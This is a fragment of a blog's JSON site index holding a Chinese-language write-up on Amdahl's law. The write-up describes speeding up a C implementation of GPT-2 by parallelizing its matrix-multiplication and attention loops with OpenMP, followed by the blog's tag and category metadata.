什么是阿姆达尔定律？根据阿姆达尔定律，我们应该把优化的重点放在哪里？ 你的优化方案和思路是什么？优化的效果受到哪些因素影响？ 题解：按照指示完成GPT2，make运行一下，发现需要20多秒。 阿姆达尔定律是一个经验法则，代表处理器并行运算之后效率提升的能力。在并行计算中，使用多个处理器的程序的加速比受限制于程序串行部分的执行时间。$$s(n)=\\frac{1}{B+(1-B)/n}$$ $s(n):$ 固定负载下，理论上的加速比 $B:$ 串行工作部分所占比例，取值0~1 $n:$ 并行线程数，并行处理节点个数 可以看出，即使我们增加处理器数量，只能对并行部分产生影响，而对非并行部分没有任何影响。因此随着处理器数量增加，整体性能的提升会趋于平缓。 根据阿姆达尔定律，应该将优化重点放在最小化串行部分，同时最大化可并行部分。 浏览源gpt.c代码中注意到，存在矩阵乘法、注意力机制和涉及大量计算的循环，可以进行并行计算，将任务分配到多个处理器上，使用OpenMP并行化矩阵乘法、前馈神经网络层等。 具体操作是在matmul_forward和attention_forward函数循环前添加代码： 12#include &lt;omp.h&gt;#pragma omp parallel for collapse(2) 同时，在MakeFile中开启编译选项-fopenmp。 12345release: cc gpt.c -lm -O3 -fopenmp -Wno-unused-result -Wno-unused-value -Wno-unused-variable -o gptdebug: cc gpt.c -lm -O1 -g -fopenmp -Wno-unused-result -Wno-unused-value -Wno-unused-variable -o gpt 前后对比一下 在保证结果不变的情况下更快的（5~6秒)完成了文本的补全。 优化效果受影响的因素： 串行部分：总加速比会受到制约 硬件资源：可用处理器的数量和硬件的性能 编译器的优化程度 并行化的开销。","link":"/2024/12/04/%F0%9F%92%BBCNSS-Recruit-Dev-2024/"}],"tags":[{"name":"Algebra","slug":"Algebra","link":"/tags/Algebra/"},{"name":"CNSS","slug":"CNSS","link":"/tags/CNSS/"},{"name":"Compiler","slug":"Compiler","link":"/tags/Compiler/"},{"name":"Linux","slug":"Linux","link":"/tags/Linux/"}],"categories":[{"name":"Crypto","slug":"Crypto","link":"/categories/Crypto/"},{"name":"CTF","slug":"CTF","link":"/categories/CTF/"},{"name":"DevOps","slug":"DevOps","link":"/categories/DevOps/"}],"pages":[{"title":"About Me","text":"一名普普通通热爱生活的计算机本科生。","link":"/about/index.html"}]}